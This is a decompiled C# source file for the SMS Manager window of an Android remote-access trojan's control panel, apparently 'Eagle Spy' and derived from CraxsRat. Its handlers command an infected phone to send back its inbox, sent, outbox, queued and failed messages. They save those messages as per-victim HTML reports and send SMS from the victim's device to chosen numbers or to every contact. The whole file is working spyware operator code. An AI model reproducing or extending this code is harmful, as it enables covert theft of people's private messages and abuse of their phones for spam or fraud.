using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x020000A8 RID: 168
	[DesignerGenerated]
	public partial class SMSManager : Form
	{
		// Token: 0x060008DA RID: 2266 RVA: 0x000DAAAC File Offset: 0x000D8CAC
		public SMSManager()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs;
			base.Closing += this.SMSManager_Closing;
			base.Activated += this.AngelAndroidForm_Activated;
			base.Deactivate += this.AngelAndroidForm_Deactivate;
			this.Title = "null";
			this.BoxTitlePaintEventArgsWait = false;
			this.InitializeComponent();
		}

		// Token: 0x060008DD RID: 2269 RVA: 0x00004F8F File Offset: 0x0000318F
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x060008DE RID: 2270 RVA: 0x000DC078 File Offset: 0x000DA278
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\14.ico");
			try
			{
				this.ClientPic.Image = this.classClient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.classClient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.classClient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.classClient.Country
				});
			}
			catch (Exception)
			{
			}
			((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
			((ToolStripDropDownMenu)this.PathsToolStripMenuItem.DropDown).BackColor = this.ctx.BackColor;
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
			this.DGV0.DefaultCellStyle.Font = reso.f;
			if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
			this.BoxTitlePaintEventArgsWait = true;
		}

		// Token: 0x060008DF RID: 2271 RVA: 0x00002423 File Offset: 0x00000623
		private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x060008E0 RID: 2272 RVA: 0x00004FC5 File Offset: 0x000031C5
		private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
		{
			if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
			{
				this.SelectMessage(e.RowIndex);
			}
		}

		// Token: 0x060008E1 RID: 2273 RVA: 0x00004FC5 File Offset: 0x000031C5
		private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
		{
			if ((e.RowIndex != -1) & (e.ColumnIndex != -1))
			{
				this.SelectMessage(e.RowIndex);
			}
		}

		// Token: 0x060008E2 RID: 2274 RVA: 0x00004FEE File Offset: 0x000031EE
		private void SelectMessage(int index)
		{
			if (index != -1)
			{
				this.showtext.Text = Conversions.ToString(this.DGV0.Rows[index].Tag);
			}
		}

		// Token: 0x060008E3 RID: 2275 RVA: 0x00002423 File Offset: 0x00000623
		private void SMSManager_Closing(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x060008E4 RID: 2276 RVA: 0x000DC1F0 File Offset: 0x000DA3F0
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(string v)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".sms",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getSMS,
						Data.SPL_SOCKET,
						"sms",
						Data.SPL_DATA,
						v
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x060008E5 RID: 2277 RVA: 0x0000501A File Offset: 0x0000321A
		private void AllToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/");
		}

		// Token: 0x060008E6 RID: 2278 RVA: 0x00005027 File Offset: 0x00003227
		private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/outbox");
		}

		// Token: 0x060008E7 RID: 2279 RVA: 0x00005034 File Offset: 0x00003234
		private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/inbox");
		}

		// Token: 0x060008E8 RID: 2280 RVA: 0x00005041 File Offset: 0x00003241
		private void SentToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/sent");
		}

		// Token: 0x060008E9 RID: 2281 RVA: 0x0000504E File Offset: 0x0000324E
		private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/queued");
		}

		// Token: 0x060008EA RID: 2282 RVA: 0x0000505B File Offset: 0x0000325B
		private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb("content://sms/failed");
		}

		// Token: 0x060008EB RID: 2283 RVA: 0x000DC2B0 File Offset: 0x000DA4B0
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					reso.SAVEit((Array)a0);
				}, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.tmpClientName,
					this.tmpCountry + " - " + this.tmpAddressIP,
					"SMS",
					"sms",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x060008EC RID: 2284 RVA: 0x000DC380 File Offset: 0x000DA580
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa(object sender, EventArgs e)
		{
			reso.Directory_Exist(this.classClient);
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				this.tmpFolderUSER,
				"SMS Manager",
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"SMS",
				"sms",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x060008ED RID: 2285 RVA: 0x000DC430 File Offset: 0x000DA630
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.BoxTitlePaintEventArgsWait)
				{
					int count = this.DGV0.Rows.Count;
					string text = "All " + Conversions.ToString(count);
					string text2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
					Rectangle rectangle = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rectangle);
					e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", reso.f);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x060008EE RID: 2286 RVA: 0x00005068 File Offset: 0x00003268
		private void AngelAndroidForm_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008EF RID: 2287 RVA: 0x00005068 File Offset: 0x00003268
		private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008F0 RID: 2288 RVA: 0x00005068 File Offset: 0x00003268
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008F1 RID: 2289 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060008F2 RID: 2290 RVA: 0x000DC5E0 File Offset: 0x000DA7E0
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.classClient != null)
					{
						smsMaker smsMaker = new smsMaker();
						if (smsMaker.ShowDialog() == DialogResult.OK && smsMaker.numslist.Items.Count > 0)
						{
							string text = smsMaker.msgtext.Text;
							TcpClient myClient = this.classClient.myClient;
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							int num = 0;
							int num2 = 0;
							if (smsMaker.checkall.Checked)
							{
								object[] array2 = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"ssms<*>all<>",
										text,
										"#",
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(num),
										Data.SPL_SOCKET,
										Conversions.ToString(num2),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										this.classClient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									this.classClient
								};
								this.classClient.SendMessage(array2);
							}
							else
							{
								int num3 = smsMaker.numslist.Items.Count - 1;
								for (int i = 0; i <= num3; i++)
								{
									string text2 = Conversions.ToString(smsMaker.numslist.Items[i]);
									if (!(string.IsNullOrEmpty(text2) | string.IsNullOrWhiteSpace(text2)))
									{
										object[] array3 = new object[]
										{
											myClient,
											string.Concat(new string[]
											{
												SecurityKey.KeysClient2,
												Data.SPL_SOCKET,
												"ssms<*>",
												text2,
												"#",
												text,
												Data.SPL_SOCKET,
												array[0],
												Data.SPL_SOCKET,
												array[1],
												Data.SPL_SOCKET,
												SecurityKey.Lockscreen,
												Data.SPL_SOCKET,
												Conversions.ToString(num),
												Data.SPL_SOCKET,
												Conversions.ToString(num2),
												Data.SPL_SOCKET,
												Data.SPL_ARRAY,
												Data.SPL_SOCKET,
												this.classClient.ClientRemoteAddress
											}),
											Codes.Encoding().GetBytes("null"),
											this.classClient
										};
										this.classClient.SendMessage(array3);
									}
								}
							}
							EagleAlert.ShowSucess("your message was sent successfully");
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060008F3 RID: 2291 RVA: 0x00005068 File Offset: 0x00003268
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008F4 RID: 2292 RVA: 0x00005068 File Offset: 0x00003268
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008F5 RID: 2293 RVA: 0x00005068 File Offset: 0x00003268
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008F6 RID: 2294
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x060008F7 RID: 2295
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x060008F8 RID: 2296 RVA: 0x00005075 File Offset: 0x00003275
		private void clinameinfo_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				SMSManager.ReleaseCapture();
				SMSManager.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x060008F9 RID: 2297 RVA: 0x00005075 File Offset: 0x00003275
		private void Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				SMSManager.ReleaseCapture();
				SMSManager.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x04000A84 RID: 2692
		public TcpClient Client;

		// Token: 0x04000A85 RID: 2693
		public Client classClient;

		// Token: 0x04000A86 RID: 2694
		public string Title;

		// Token: 0x04000A87 RID: 2695
		public string tmpFolderUSER;

		// Token: 0x04000A88 RID: 2696
		public string tmpClientName;

		// Token: 0x04000A89 RID: 2697
		public string tmpCountry;

		// Token: 0x04000A8A RID: 2698
		public string tmpAddressIP;

		// Token: 0x04000A8B RID: 2699
		private bool BoxTitlePaintEventArgsWait;
	}
}
